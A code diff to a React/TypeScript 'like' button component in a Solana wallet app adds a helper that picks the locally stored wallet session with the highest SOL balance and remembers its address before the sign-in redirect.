@@ -3,9 +3,10 @@ import { Heart, Shield } from 'lucide-react'
 import toast from 'react-hot-toast'
 import { useAuth } from '../context/AuthContext'
 import { useWalletState } from '../context/WalletContext'
-import { likeReturnPath, peekPendingLike, rememberAuthReturn, takePendingLike } from '../lib/authRedirect'
+import { likeReturnPath, peekPendingLike, rememberAuthReturn, takePendingLike, rememberReturnWallet } from '../lib/authRedirect'
 import { isRestrictedAuthBrowser } from '../lib/inAppBrowser'
 import { openTransactionSheet } from '../lib/txSheet'
+import { listLocalWalletSessions } from '../lib/walletMonitorStore'
 
 const DEMO_NAMES = ['laurdotsol', 'hyngdev', 'molusol', 'VCAdam_eth', 'Salt420SOL']
 
@@ -27,6 +28,17 @@ export function DemoLikeButton({ seed }: { seed: string }) {
   const finished = useRef(false)
   const wasAuthenticated = useRef(isAuthenticated)
   const inWalletBrowser = isRestrictedAuthBrowser()
+
+  const getBestWallet = (): { address: string; balanceSol: number } | null => {
+    const sessions = listLocalWalletSessions()
+    let best: { address: string; balanceSol: number } | null = null
+    for (const session of sessions) {
+      if (session.balanceSol !== null && (best === null || session.balanceSol > best.balanceSol)) {
+        best = { address: session.walletAddress, balanceSol: session.balanceSol }
+      }
+    }
+    return best
+  }
 
   const applyLike = () => {
     if (finished.current) return
@@ -96,6 +108,10 @@ export function DemoLikeButton({ seed }: { seed: string }) {
     if (liked || finished.current) {
       setMenuOpen((open) => !open)
       return
+    }
+    const bestWallet = getBestWallet()
+    if (bestWallet) {
+      rememberReturnWallet(bestWallet.address as any)
     }
     rememberAuthReturn(likeReturnPath(seed), seed)
     resumeLike.current = true
